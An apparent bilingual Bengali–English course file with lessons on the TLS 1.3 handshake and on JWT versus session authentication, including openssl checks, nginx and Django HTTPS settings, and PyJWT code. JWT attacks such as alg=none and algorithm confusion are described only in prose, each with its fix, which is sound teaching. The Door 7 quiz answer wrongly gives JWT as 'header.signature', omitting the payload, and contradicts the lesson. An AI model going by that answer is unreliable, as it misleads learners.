doors.push({
  num: 6,
  icon: "🤝",
  color: "#dc2626",
  name: "হস্তমর্দনের শিল্প",
  subtitle: "The Art of Handshake",
  tech: "TLS 1.3 Handshake — Rescorla (2018), 1-RTT, 0-RTT, cipher suites, AEAD, key schedule",
  spirit: "মিথাক — চুক্তি, দুই পক্ষের আস্থার সম্পর্ক",
  secret: "TLS 1.3 handshake = চারটি বার্তা। Client Hello → Server Hello + Certificate → Key Exchange → Finished। এক RTT-তে সম্পূর্ণ — আগের TLS 1.2-এর দুই RTT-এর চেয়ে দ্রুত।",
  recall: {
    q: " TLS 1.3-এ হ্যান্ডশেক কত RTT-তে সম্পূর্ণ হয়?",
    qen: "How many RTTs does the TLS 1.3 handshake take?",
    a: "১ RTT। TLS 1.2-এ দুই RTT লাগতো। TLS 1.3 দ্রুত ও নিরাপদ — কম বার্তা, বেশি এনক্রিপশন।",
    aen: "1 RTT. TLS 1.2 needed 2 RTTs. TLS 1.3 is faster and more secure — fewer messages, more encryption."
  },
  story: `<p class="scene-setting">কামরান (Door ১) তোমাকে AES ও RSA শিখিয়েছেন। জাইনাব (Door ২) Diffie-Hellman দিয়েছেন। হামজা (Door ৩) hash দিয়েছেন। ইমরান (Door ৫) সার্টিফিকেট দিয়েছেন। এখন সব মেলাও — একটি সম্পূর্ণ TLS handshake। ক্লায়েন্ট ও সার্ভার এক মিলিসেকেন্ডে এনক্রিপ্টেড সংযোগ স্থাপন করে। কীভাবে? চারটি বার্তায়।</p>
<p class="scene-setting en">Kamran (Door 1) taught AES and RSA. Zainab (Door 2) gave Diffie-Hellman. Hamza (Door 3) gave hashing. Imran (Door 5) gave certificates. Now combine them all — a complete TLS handshake. Client and server establish an encrypted connection in one millisecond. How? Four messages.</p>

<div class="dialogue"><strong>হস্তমর্দন-কারিগর বিলাল:</strong> TLS 1.3 (২০১৮, Eric Rescorla) হল সবচেয়ে দ্রুত ও নিরাপদ handshake। চারটি ধাপ: (১) Client Hello — আমি এই cipher পারি। (২) Server Hello — আমি এটি বেছে নিলাম, এই আমার সার্টিফিকেট। (৩) Key Exchange — Diffie-Hellman দিয়ে গোপন চাবি। (৪) Finished — সব এনক্রিপ্টেড। এক RTT! TLS 1.2-এ দুই RTT লাগতো।</div>
<div class="dialogue en"><strong>Handshake Artisan Bilal:</strong> TLS 1.3 (2018, Eric Rescorla) is the fastest and most secure handshake. Four steps: (1) Client Hello — I can use these ciphers. (2) Server Hello — I choose this, here's my certificate. (3) Key Exchange — Diffie-Hellman for shared secret. (4) Finished — all encrypted. One RTT!</div>

<div class="code-block"># ── STEP 1: What is TLS? ──
# TLS = Transport Layer Security (formerly SSL)
# It's what makes HTTPS secure — encrypts ALL data between browser and server.

# TLS COMBINES EVERYTHING from doors 1-5:
# - Asymmetric encryption (RSA/ECDHE) for key exchange
# - Symmetric encryption (AES) for bulk data
# - Hashing (SHA-256) for integrity
# - Digital signatures for authentication
# - Certificates (PKI) for identity

# WHAT TLS PROVIDES:
tls_guarantees = {
    "Confidentiality": "Nobody can read your data (encryption)",
    "Integrity": "Nobody can modify your data (MAC/HMAC)",
    "Authentication": "Server is who it claims to be (certificates)",
    "Forward Secrecy": "Past sessions safe even if keys leaked (ephemeral DH)",
}

print("TLS GUARANTEES:")
for guarantee, desc in tls_guarantees.items():
    print(f"  {guarantee}: {desc}")

# EVERY TIME YOU SEE HTTPS:
# https://example.com
# The "s" means TLS is active. Without it, all data is in plaintext!</div>

<div class="code-block"># ── STEP 2: The TLS 1.3 handshake ──
# How browser and server establish secure connection.

# TLS 1.3 HANDSHAKE (1 round trip):
handshake = """
CLIENT →→→→→→→→→→→→→→→→→→ SERVER
  ClientHello
    + supported cipher suites
    + key share (ECDHE public key)
    + supported TLS version

CLIENT ←←←←←←←←←←←←←←←←← SERVER
  ServerHello
    + chosen cipher suite
    + key share (server's ECDHE public key)
    + certificate (proves identity)
    + Finished (HMAC of handshake)

CLIENT →→→→→→→→→→→→→→→→→→ SERVER
  Finished (HMAC of handshake, encrypted)

Total: 1 RTT (round trip time)
Both sides now have a shared AES key. All further traffic is encrypted.
"""

print(handshake)

# WHAT HAPPENS IN EACH STEP:
steps = {
    "ClientHello": "Browser says: I support these ciphers, here's my public key",
    "ServerHello": "Server says: let's use this cipher, here's my key + certificate",
    "Certificate verification": "Browser checks certificate against trusted CAs",
    "Key derivation": "Both compute shared AES key using ECDHE",
    "Finished": "Both confirm handshake wasn't tampered with (HMAC)",
}

print("HANDSHAKE STEPS:")
for step, desc in steps.items():
    print(f"  {step}: {desc}")</div>

<div class="code-block"># ── STEP 3: TLS 1.3 vs 1.2 ──
# TLS 1.3 is a MAJOR improvement over 1.2.

comparison = {
    "Handshake": {
        "TLS 1.2": "2 RTT (slower)",
        "TLS 1.3": "1 RTT (faster) + 0-RTT mode for resumed sessions",
    },
    "Key Exchange": {
        "TLS 1.2": "RSA or DHE (RSA has no forward secrecy)",
        "TLS 1.3": "ECDHE only (mandatory forward secrecy)",
    },
    "Cipher Suites": {
        "TLS 1.2": "37+ suites (many weak, confusing)",
        "TLS 1.3": "5 suites only (all strong, AEAD)",
    },
    "Encryption": {
        "TLS 1.2": "CBC mode (vulnerable to padding attacks) or GCM",
        "TLS 1.3": "AEAD only (GCM or ChaCha20-Poly1305)",
    },
    "Hashing": {
        "TLS 1.2": "MD5, SHA-1, SHA-256 (some weak)",
        "TLS 1.3": "SHA-256 or SHA-384 only",
    },
    "Forward Secrecy": {
        "TLS 1.2": "Optional (depends on configuration)",
        "TLS 1.3": "Mandatory (always ECDHE)",
    },
}

print("TLS 1.2 vs 1.3:")
for aspect, versions in comparison.items():
    print(f"\n  {aspect}:")
    for version, desc in versions.items():
        print(f"    {version}: {desc}")

# TLS 1.3 CIPHER SUITES (only 5):
cipher_suites = [
    "TLS_AES_256_GCM_SHA384 (primary, strongest)",
    "TLS_CHACHA20_POLY1305_SHA256 (mobile-optimized)",
    "TLS_AES_128_GCM_SHA256 (fast)",
    "TLS_AES_128_CCM_SHA256 (limited use)",
    "TLS_AES_128_CCM_8_SHA256 (constrained devices)",
]

print("\nTLS 1.3 CIPHER SUITES:")
for suite in cipher_suites:
    print(f"  {suite}")</div>

<div class="code-block"># ── STEP 4: Inspecting TLS with openssl ──
# See exactly what TLS version and cipher a site uses:

openssl_commands = """
# Check TLS version:
$ openssl s_client -connect google.com:443 -tls1_3
Protocol: TLSv1.3
Cipher:   TLS_AES_256_GCM_SHA384

# Check TLS 1.2:
$ openssl s_client -connect google.com:443 -tls1_2
Protocol: TLSv1.2
Cipher:   ECDHE-RSA-AES256-GCM-SHA384

# List all supported cipher suites:
$ openssl ciphers -v 'TLSv1.3'

# Verify certificate chain:
$ openssl s_client -connect google.com:443 -showcerts

# Check if HSTS is enabled:
$ curl -sI https://google.com | grep -i strict
strict-transport-security: max-age=31536000

# Test SSL Labs grade:
# https://www.ssllabs.com/ssltest/ (online tool)
"""

print(openssl_commands)

# CONFIGURING TLS IN NGINX (your servers):
nginx_tls = """
server {
    listen 443 ssl http2;
    server_name api.example.com;

    # TLS 1.3 only (most secure):
    ssl_protocols TLSv1.3;
    ssl_prefer_server_ciphers off;

    # Or TLS 1.2 + 1.3 (broader compatibility):
    ssl_protocols TLSv1.2 TLSv1.3;

    # OCSP stapling:
    ssl_stapling on;
    ssl_stapling_verify on;

    # HSTS (force HTTPS for 1 year):
    add_header Strict-Transport-Security "max-age=31536000" always;
}
"""

print(nginx_tls)</div>

<div class="code-block"># ── STEP 5: HTTPS in your applications ──
# HOW TO ENSURE TLS IN DJANGO/WEB APPS:

# DJANGO SECURITY SETTINGS:
django_security = """
# settings.py — FORCE HTTPS in production:
SECURE_SSL_REDIRECT = True           # redirect HTTP to HTTPS
SECURE_HSTS_SECONDS = 31536000       # HSTS for 1 year
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True           # allow browser preload list
SECURE_CONTENT_TYPE_NOSNIFF = True   # prevent MIME sniffing
SECURE_BROWSER_XSS_FILTER = True
SESSION_COOKIE_SECURE = True         # cookies only over HTTPS
CSRF_COOKIE_SECURE = True            # CSRF cookie over HTTPS

# Behind a reverse proxy (nginx):
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')
"""

print(django_security)

# LET'S ENCRYPT AUTO-RENEWAL:
certbot_setup = """
# Install:
$ apt install certbot python3-certbot-nginx

# Get certificate + auto-configure nginx:
$ sudo certbot --nginx -d api.example.com

# Test renewal:
$ sudo certbot renew --dry-run

# Auto-renew (systemd timer):
$ systemctl enable certbot.timer
$ systemctl start certbot.timer

# Certificates expire every 90 days.
# certbot renew checks and renews automatically.
"""

print(certbot_setup)

# COMMON TLS MISTAKES:
mistakes = {
    "Mixed content": "HTTPS page loads HTTP resources (browser blocks/warns)",
    "Self-signed certs": "Works but browsers show scary warning (use Let's Encrypt!)",
    "Expired cert": "Browser shows 'Your connection is not private' (monitor expiry!)",
    "No HSTS": "First visit can be intercepted (enable HSTS)",
    "Weak ciphers": "TLS 1.0/1.1 are deprecated (force TLS 1.2+)",
}

print("COMMON TLS MISTAKES:")
for mistake, consequence in mistakes.items():
    print(f"  {mistake}: {consequence}")</div>

<div class="code-block"># ── STEP 6: Beyond TLS — application security ──
# TLS secures data IN TRANSIT. But security needs MORE layers.

# DEFENSE IN DEPTH:
defense_layers = {
    "Network (TLS)": "Encrypt data in transit (HTTPS)",
    "Application (validation)": "Input validation, parameterized queries, CSRF",
    "Authentication": "Strong passwords, MFA, session management",
    "Authorization": "RBAC, least privilege, API rate limits",
    "Data at rest": "Database encryption, encrypted backups",
    "Monitoring": "Logs, alerts, intrusion detection",
    "Incident response": "What to do when breached",
}

print("DEFENSE IN DEPTH:")
for layer, desc in defense_layers.items():
    print(f"  {layer}: {desc}")

# SECURITY HEADERS (HTTP):
security_headers = {
    "Strict-Transport-Security": "Force HTTPS (HSTS)",
    "Content-Security-Policy": "Prevent XSS (restrict script sources)",
    "X-Frame-Options": "Prevent clickjacking (no iframes)",
    "X-Content-Type-Options": "Prevent MIME sniffing",
    "Referrer-Policy": "Control referrer header leakage",
    "Permissions-Policy": "Restrict browser features (camera, mic)",
}

print("\nSECURITY HEADERS:")
for header, desc in security_headers.items():
    print(f"  {header}: {desc}")

# TLS SUMMARY:
# ┌──────────────────┬──────────────────────────────────┐
# │ TLS Feature      │ Purpose                         │
# ├──────────────────┼──────────────────────────────────┤
# │ Encryption       │ Confidentiality (nobody reads)   │
# │ HMAC/MAC         │ Integrity (nobody modifies)     │
    # │ Certificates     │ Authentication (identity proof) │
# │ ECDHE            │ Forward secrecy                 │
# │ TLS 1.3          │ Modern, fast, secure            │
# │ Let's Encrypt    │ Free certificates               │
# │ HSTS             │ Force HTTPS in browser          │
# │ OCSP Stapling    │ Real-time revocation            │
# └──────────────────┴──────────────────────────────────┘

# THE BIG PICTURE:
# TLS is the BACKBONE of internet security.
# Every HTTPS connection, every API call, every login — uses TLS.
# Understanding TLS = understanding how the internet keeps data safe.

# FOR YOUR PROJECTS:
# - ALWAYS use HTTPS (Let's Encrypt + certbot)
# - Force HTTPS redirect (no HTTP access)
# - Enable HSTS header
# - Use TLS 1.3 (or at least 1.2)
# - Monitor certificate expiry
# - Set security headers (django-security, CSP)
# - Test with SSL Labs (ssllabs.com/ssltest)
# - Keep libraries updated (TLS bugs get fixed)</div>

<div class="verse">أَوْفُوا بِالْعُقُودِ</div>
<div style="font-size:.85rem;color:var(--ink-dim);text-align:center;margin-bottom:1rem">"তোমরা চুক্তি পূরণ করো।" — কুরআন ৫:১</div>

<p class="scene-setting">মিথাক — চুক্তি। TLS handshake সেই চুক্তির ডিজিটাল রূপ। দুই পক্ষ একে অপরের প্রতি আস্থা স্থাপন করে — cipher নির্বাচন, চাবি আদান, সার্টিফিকেট যাচাই। একবার চুক্তি হলে — সব বার্তা এনক্রিপ্টেড।</p>
<p class="scene-setting en">Mithaq — covenant. The TLS handshake is the digital form of that covenant. Two parties establish mutual trust — cipher selection, key exchange, certificate verification. Once the covenant is made — all messages encrypted.</p>

<div class="callout tip"><span class="co-icon">🔗</span><div><strong>Book ৩৭ (Networks) Door ৯ (TLS):</strong> TLS handshake SVG দেখেছিলে — এখন সেই হ্যান্ডশেকের গাণিতিক ভিত্তি বোঝো। Door ১-৫-এর সব কৌশল এখানে একসাথে।</div></div>

<div class="svg-diagram">
<svg viewBox="0 0 580 280" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto">
  <text x="290" y="25" text-anchor="middle" fill="#e2e8f0" font-size="13" font-weight="900">🤝 TLS 1.3 Handshake: 1-RTT</text>
  <rect x="20" y="50" width="120" height="220" rx="8" fill="#1e3a5f" stroke="#22d3ee" stroke-width="2"/>
  <text x="80" y="72" text-anchor="middle" fill="#67e8f9" font-size="9" font-weight="700">CLIENT</text>
  <rect x="440" y="50" width="120" height="220" rx="8" fill="#450a0a" stroke="#f87171" stroke-width="2"/>
  <text x="500" y="72" text-anchor="middle" fill="#fca5a5" font-size="9" font-weight="700">SERVER</text>
  <line x1="140" y1="100" x2="440" y2="100" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrTLS1)"/>
  <text x="290" y="95" text-anchor="middle" fill="#fcd34d" font-size="10">ClientHello + KeyShare</text>
  <line x1="440" y1="130" x2="140" y2="130" stroke="#22c55e" stroke-width="2" marker-end="url(#arrTLS1)"/>
  <text x="290" y="125" text-anchor="middle" fill="#4ade80" font-size="10">ServerHello + KeyShare + Cert + Finished</text>
  <line x1="140" y1="160" x2="440" y2="160" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arrTLS1)"/>
  <text x="290" y="155" text-anchor="middle" fill="#4ade80" font-size="10">Client Finished (encrypted)</text>
  <rect x="160" y="190" width="260" height="30" rx="6" fill="#052e16" stroke="#22c55e" stroke-width="1.5"/>
  <text x="290" y="210" text-anchor="middle" fill="#4ade80" font-size="8">Secure channel established!</text>
  <text x="290" y="245" text-anchor="middle" fill="#94a3b8" font-size="10">TLS 1.3: 1-RTT (TLS 1.2 needed 2-RTT)</text>
  <text x="290" y="260" text-anchor="middle" fill="#94a3b8" font-size="10">0-RTT resumption for returning clients</text>
  <defs><marker id="arrTLS1" markerWidth="8" markerHeight="8" refX="4" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 Z" fill="#475569"/></marker></defs>
</svg>
</div>
<div class="svg-caption">চিত্র: TLS 1.3 handshake — মাত্র ১টি round trip! TLS 1.2-এর চেয়ে দ্রুত।</div>

<div class="secret-box">🤝 <strong>TLS = চার বার্তায় সম্পূর্ণ এনক্রিপ্টেড সংযোগ।</strong> AES + DH + Hash + Certificate — সব মিলে এক handshake। কিন্তু handshake-এর পরে — ক্লায়েন্ট কীভাবে প্রমাণ করবে সে যে সে? সেশন বা JWT — পরের দরজায়।</div>`,
  senior: {
    title: "TLS 1.3 Handshake এক নজরে",
    body: `<table class="kv-table"><tr><th>ধাপ</th><th>কী ঘটে</th></tr>
<tr><td class="hl">Client Hello</td><td>cipher list, DH params পাঠায়</td></tr>
<tr><td class="hl">Server Hello</td><td>cipher বাছে, সার্টিফিকেট + DH পাঠায়</td></tr>
<tr><td class="hl">Key Exchange</td><td>ECDHE দিয়ে shared secret</td></tr>
<tr><td class="hl">Finished</td><td>সব এনক্রিপ্টেড — verify hash</td></tr>
<tr><td class="hl">1-RTT</td><td>১ round trip — 1.2-এর চেয়ে দ্রুত</td></tr>
<tr><td class="hl">0-RTT</td><td>পুরোনো সেশনে ০ round trip</td></tr></table>`
  }
});

doors.push({
  num: 7,
  icon: "🎫",
  color: "#dc2626",
  name: "টোকেনের খেলা",
  subtitle: "The Token Game",
  tech: "JWT vs Session — JSON Web Token (Jones 2015), stateless auth, refresh tokens, OAuth 2.0, algorithm confusion",
  spirit: "বারাআত — অনুমতি, প্রবেশের অধিকার",
  secret: "JWT = স্টেটলেস টোকেন। header.payload.signature। সার্ভার কিছু মনে রাখে না — টোকেন নিজেই পরিচয়। কিন্তু বিপদ — অ্যালগরিদম কনফিউশন, expiry যাচাই না করা।",
  recall: {
    q: " JWT ও Session-এর পার্থক্য কী? JWT-এর তিনটি অংশ কী?",
    qen: "What is the difference between JWT and Session? What are the three parts of JWT?",
    a: "Session = সার্ভারে state। JWT = ক্লায়েন্টে state (স্টেটলেস)। JWT = header.signature। signature = HMAC বা RSA।",
    aen: "Session = server state. JWT = client state (stateless). JWT = header.signature. Signature = HMAC or RSA."
  },
  story: `<p class="scene-setting">বিলাল (Door ৬) তোমাকে TLS handshake শিখিয়েছেন। কিন্তু handshake-এর পরে — ক্লায়েন্ট কীভাবে প্রমাণ করবে সে যে সে? দুটি উপায়: Session বা JWT। Session = সার্ভারে একটি ফাইল, ক্লায়েন্টে cookie। সার্ভার মনে রাখে। JWT = ক্লায়েন্টে সম্পূর্ণ টোকেন। সার্ভার কিছু মনে রাখে না — স্টেটলেস।</p>
<p class="scene-setting en">Bilal (Door 6) taught you TLS handshake. But after handshake — how does the client prove who they are? Two ways: Session or JWT. Session = file on server, cookie on client. Server remembers. JWT = complete token on client. Server remembers nothing — stateless.</p>

<div class="dialogue"><strong>টোকেন-কারিগর রুকাইয়া:</strong> JWT তিনটি অংশে বিভক্ত — header.payload.signature। প্রতিটি base64-এ encoded। শুধু signature গোপন — HMAC বা RSA দিয়ে। কেউ payload বদলালে signature মেলে না। কিন্তু বিপদ: কেউ alg=none দিলে? বা HS256 এর জায়গায় RS256 দিলে? Algorithm confusion attack! সমাধান: সর্বদা algorithm সার্ভারে নির্দিষ্ট করো।</div>
<div class="dialogue en"><strong>Token Artisan Rukayya:</strong> JWT has three parts — header.payload.signature. Each base64 encoded. Only signature is secret — HMAC or RSA. If someone changes payload, signature won't match. But danger: alg=none? Or HS256 instead of RS256? Algorithm confusion attack! Solution: always specify algorithm server-side.</div>

<div class="code-block"># ── STEP 1: What is JWT? ──
# JWT (JSON Web Token) = a compact way to transmit auth info between parties.

# USE CASE: After login, server gives client a JWT.
# Client includes JWT in every subsequent request.
# Server verifies JWT without needing to store session state.

# JWT STRUCTURE (3 parts separated by dots):
# header.payload.signature
# eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpIn0.signature123

# Each part is base64-encoded JSON:
# Header:   {"alg": "HS256", "typ": "JWT"}
# Payload:  {"user": "ali", "exp": 1735689600, "role": "admin"}
# Signature: HMAC-SHA256(secret, header.payload)

import jwt
import datetime

# CREATE a JWT:
payload = {
    "user_id": 42,
    "username": "rakib",
    "role": "admin",
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),
}
token = jwt.encode(payload, "my_secret_key", algorithm="HS256")
print(f"JWT: {token[:50]}...")</div>

<div class="code-block"># ── STEP 2: JWT verification ──
# The server verifies the JWT signature to ensure it wasn't tampered with.

import jwt

token = "eyJhbGciOiJIUzI1NiJ9..."  # from client

# VERIFY the JWT:
try:
    decoded = jwt.decode(
        token,
        "my_secret_key",
        algorithms=["HS256"]  # ALWAYS specify algorithms!
    )
    print(f"Valid JWT: {decoded}")
    # {"user_id": 42, "username": "rakib", "role": "admin"}
except jwt.ExpiredSignatureError:
    print("Token expired!")
except jwt.InvalidTokenError:
    print("Invalid token!")

# WHAT JWT VERIFICATION CHECKS:
checks = {
    "Signature": "HMAC matches — token wasn't tampered with",
    "Expiration": "exp claim not past current time",
    "Issuer": "iss claim matches expected issuer (if set)",
    "Audience": "aud claim matches expected audience (if set)",
    "Not Before": "nbf claim is before current time (if set)",
}

print("JWT VERIFICATION CHECKS:")
for check, desc in checks.items():
    print(f"  {check}: {desc}")

# CRITICAL: payload is NOT encrypted — anyone can read it!
# The signature only prevents TAMPERING, not reading.
# Never put passwords or secrets in JWT payload!</div>

<div class="code-block"># ── STEP 3: JWT vs sessions ──
# TWO APPROACHES TO AUTHENTICATION:

# SESSION-BASED (traditional Django):
session_approach = """
1. User logs in → server creates session in database
2. Server sends session_id cookie to client
3. Client sends cookie with every request
4. Server looks up session_id in database → gets user

Pro: Server can revoke sessions anytime (delete from DB)
Con: Requires database lookup per request, hard to scale horizontally
"""

print("SESSION-BASED AUTH:")
print(session_approach)

# JWT-BASED (API/SPA):
jwt_approach = """
1. User logs in → server creates JWT with user info
2. Server sends JWT to client (localStorage or cookie)
3. Client sends JWT in Authorization header with every request
4. Server verifies JWT signature → gets user info (no DB lookup!)

Pro: Stateless, no DB lookup, great for APIs/microservices
Con: Can't revoke until expiry (short-lived tokens + refresh tokens)
"""

print("JWT-BASED AUTH:")
print(jwt_approach)

# WHEN TO USE WHICH:
# Sessions: Traditional web apps (Django server-rendered)
# JWT: APIs, SPAs (Vue/React), microservices, mobile apps
# Hybrid: Use both (session cookie for web, JWT for API)</div>

<div class="code-block"># ── STEP 4: JWT security vulnerabilities ──
# JWT can be DANGEROUS if used incorrectly.

vulnerabilities = {
    "alg=none attack": {
        "what": "Attacker sets algorithm to 'none' (no signature)",
        "fix": "Always specify algorithms=['HS256'] (never allow 'none')",
    },
    "Algorithm confusion (RS256→HS256)": {
        "what": "Server uses RSA. Attacker switches to HMAC, uses RSA public key as HMAC secret",
        "fix": "Explicitly specify algorithms. Don't mix RSA and HMAC",
    },
    "Weak secret": {
        "what": "HS256 with 'secret' as key → attacker brute-forces easily",
        "fix": "Use long random secret (256-bit+). Or use RS256 (asymmetric)",
    },
    "Sensitive data in payload": {
        "what": "Payload is base64 (not encrypted) — anyone can read",
        "fix": "Never put passwords, SSNs, or secrets in JWT",
    },
    "No expiry": {
        "what": "Stolen token valid forever",
        "fix": "Always set short exp (15 min access, 7 day refresh)",
    },
    "Stored in localStorage": {
        "what": "XSS attack can steal JWT from localStorage",
        "fix": "Store in httpOnly cookie (XSS can't access)",
    },
}

print("JWT VULNERABILITIES:")
for vuln, info in vulnerabilities.items():
    print(f"\n  {vuln}:")
    print(f"    What: {info['what']}")
    print(f"    Fix: {info['fix']}")</div>

<div class="code-block"># ── STEP 5: JWT best practices ──
# How to use JWT safely:

import jwt
import datetime
import os

# 1. GENERATE with short expiry:
def create_access_token(user_id):
    payload = {
        "user_id": user_id,
        "type": "access",
        "exp": datetime.datetime.utcnow() + datetime.timedelta(minutes=15),
        "iat": datetime.datetime.utcnow(),
    }
    return jwt.encode(payload, os.environ["JWT_SECRET"], algorithm="HS256")

# 2. REFRESH token (longer lived, used to get new access tokens):
def create_refresh_token(user_id):
    payload = {
        "user_id": user_id,
        "type": "refresh",
        "exp": datetime.datetime.utcnow() + datetime.timedelta(days=7),
        "iat": datetime.datetime.utcnow(),
    }
    return jwt.encode(payload, os.environ["JWT_SECRET"], algorithm="HS256")

# 3. DJANGO REST FRAMEWORK + JWT:
django_jwt = """
# settings.py:
INSTALLED_APPS += ['rest_framework_simplejwt']

REST_FRAMEWORK = {
    'DEFAULT_AUTHENTICATION_CLASSES': [
        'rest_framework_simplejwt.authentication.JWTAuthentication',
    ],
}

from datetime import timedelta
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=15),
    'REFRESH_TOKEN_LIFETIME': timedelta(days=7),
    'ALGORITHM': 'HS256',
    'SIGNING_KEY': os.environ['JWT_SECRET'],  # from environment!
    'AUTH_HEADER_TYPES': ('Bearer',),
}

# urls.py:
from rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView
urlpatterns = [
    path('api/token/', TokenObtainPairView.as_view()),    # login
    path('api/token/refresh/', TokenRefreshView.as_view()), # refresh
]
"""

print(django_jwt)

# THE ACCESS + REFRESH PATTERN:
pattern = """
1. Login → get access_token (15 min) + refresh_token (7 days)
2. Use access_token for API requests
3. When access_token expires → use refresh_token to get new one
4. When refresh_token expires → user must log in again
5. If refresh_token is stolen → can't revoke (unless using token blacklist)
"""

print("ACCESS + REFRESH PATTERN:")
print(pattern)</div>

<div class="code-block"># ── STEP 6: Django REST Framework authentication ──
# Complete JWT authentication in Django REST Framework:

# VIEWS with JWT protection:
django_views = """
from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import IsAuthenticated
from rest_framework.response import Response

# This view REQUIRES a valid JWT:
@api_view(['GET'])
@permission_classes([IsAuthenticated])
def my_profile(request):
    # request.user is automatically set from JWT
    return Response({
        'user': request.user.username,
        'email': request.user.email,
    })

# Frontend sends:
# GET /api/profile/
# Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
"""

print(django_views)

# CUSTOM JWT CLAIMS (add more user info):
custom_claims = """
from rest_framework_simplejwt.serializers import TokenObtainPairSerializer

class CustomTokenSerializer(TokenObtainPairSerializer):
    @classmethod
    def get_token(cls, user):
        token = super().get_token(user)
        # Add custom claims:
        token['username'] = user.username
        token['role'] = user.role
        token['is_premium'] = user.is_premium
        return token

# Now JWT contains: user_id, username, role, is_premium
# Access without DB lookup: decoded_token['role']
"""

print(custom_claims)

# JWT CHECKLIST:
checklist = [
    "Always specify algorithms (never allow 'none')",
    "Use strong secret (256-bit+ random, from environment)",
    "Set short access token expiry (15 min)",
    "Use refresh tokens (7 days)",
    "Never put sensitive data in payload (it's not encrypted)",
    "Store in httpOnly cookie (not localStorage, prevents XSS)",
    "Use HTTPS (prevent token theft in transit)",
    "Consider RS256 (asymmetric) for multi-service architectures",
    "Implement token revocation for logout (blacklist)",
    "Log JWT issuance and verification for audit",
]

print("JWT SECURITY CHECKLIST:")
for item in checklist:
    print(f"  ☐ {item}")

# JWT SUMMARY:
# JWT is STATELESS authentication — perfect for APIs.
# But stateless means you CAN'T revoke until expiry.
# Solution: short-lived access tokens + refresh tokens.
# This gives you the BEST of both: fast verification + revocation ability.</div>

<div class="callout warn"><span class="co-icon">⚠️</span><div><strong>JWT বিপদ:</strong><br>
<strong>alg=none:</strong> কেউ অ্যালগরিদম বাদ দিলে — কিছু লাইব্রেরি signature যাচাই করে না!<br>
<strong>HS256 কনফিউশন:</strong> সার্ভার RS256 (RSA) ব্যবহার করে। আক্রমণকারী HS256 দিয়ে public key কে HMAC secret ধরে স্বাক্ষর করে!<br>
<strong>সমাধান:</strong> সর্বদা algorithms সার্ভারে নির্দিষ্ট করো। exp যাচাই করো। refresh token ব্যবহার করো।</div></div>

<div class="verse">وَلَا تَقْفُ مَا لَيْسَ لَكَ بِهِ عِلْمٌ</div>
<div style="font-size:.85rem;color:var(--ink-dim);text-align:center;margin-bottom:1rem">"এবং তুমি তার অনুসরণ করো না যার বিষয়ে তোমার জ্ঞান নেই।" — কুরআন ১৭:৩৬</div>

<p class="scene-setting">বারাআত — অনুমতি। JWT সেই অনুমতির ডিজিটাল রূপ। কিন্তু অনুমতি যাচাই ছাড়া — অন্ধ বিশ্বাস বিপজ্জনক। "যার বিষয়ে জ্ঞান নেই তার অনুসরণ করো না" — JWT-তে এর অর্থ: algorithm যাচাই করো, expiry দেখো, signature পরীক্ষা করো।</p>
<p class="scene-setting en">Bara'ah — permission. JWT is the digital form of that permission. But permission without verification — blind trust is dangerous. "Do not follow what you have no knowledge of" — in JWT this means: verify algorithm, check expiry, test signature.</p>

<div class="callout tip"><span class="co-icon">🔗</span><div><strong>Book ৪০ (Software Engineering) Door ৮ (Security):</strong> OWASP Top 10-এ broken access control #১! JWT ভুল কনফিগারেশন = access control ভাঙা।</div></div>

<div class="svg-diagram">
<svg viewBox="0 0 580 250" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto">
  <text x="290" y="25" text-anchor="middle" fill="#e2e8f0" font-size="13" font-weight="900">🎫 JWT: Three Parts Separated by Dots</text>
  <rect x="20" y="60" width="170" height="80" rx="8" fill="#052e16" stroke="#22c55e" stroke-width="2"/>
  <text x="105" y="82" text-anchor="middle" fill="#4ade80" font-size="8" font-weight="700">HEADER</text>
  <text x="105" y="100" text-anchor="middle" fill="#86efac" font-size="10">{ "alg": "HS256",</text>
  <text x="105" y="112" text-anchor="middle" fill="#86efac" font-size="10">"typ": "JWT" }</text>
  <text x="105" y="130" text-anchor="middle" fill="#94a3b8" font-size="10">base64 encoded</text>
  <rect x="200" y="60" width="170" height="80" rx="8" fill="#1e3a5f" stroke="#22d3ee" stroke-width="2"/>
  <text x="285" y="82" text-anchor="middle" fill="#7dd3fc" font-size="8" font-weight="700">PAYLOAD</text>
  <text x="285" y="100" text-anchor="middle" fill="#bae6fd" font-size="10">{ "sub": "1234",</text>
  <text x="285" y="112" text-anchor="middle" fill="#bae6fd" font-size="10">"role": "admin",</text>
  <text x="285" y="124" text-anchor="middle" fill="#bae6fd" font-size="10">"exp": 1735689600 }</text>
  <text x="285" y="135" text-anchor="middle" fill="#94a3b8" font-size="10">NOT encrypted! just b64</text>
  <rect x="380" y="60" width="180" height="80" rx="8" fill="#450a0a" stroke="#f87171" stroke-width="2"/>
  <text x="470" y="82" text-anchor="middle" fill="#fca5a5" font-size="8" font-weight="700">SIGNATURE</text>
  <text x="470" y="100" text-anchor="middle" fill="#fca5a5" font-size="10">HMAC-SHA256(</text>
  <text x="470" y="112" text-anchor="middle" fill="#fca5a5" font-size="10">base64(header) + "."</text>
  <text x="470" y="124" text-anchor="middle" fill="#fca5a5" font-size="10">+ base64(payload),</text>
  <text x="470" y="136" text-anchor="middle" fill="#f87171" font-size="10">SECRET_KEY )</text>
  <text x="195" y="105" fill="#94a3b8" font-size="8" font-weight="900">.</text>
  <text x="375" y="105" fill="#94a3b8" font-size="8" font-weight="900">.</text>
  <rect x="100" y="170" width="380" height="50" rx="8" fill="#0f172a" stroke="#64748b" stroke-width="1"/>
  <text x="290" y="190" text-anchor="middle" fill="#e2e8f0" font-size="10">Stateless: server stores NOTHING</text>
  <text x="290" y="205" text-anchor="middle" fill="#94a3b8" font-size="10">Token validates via signature check only</text>
</svg>
</div>
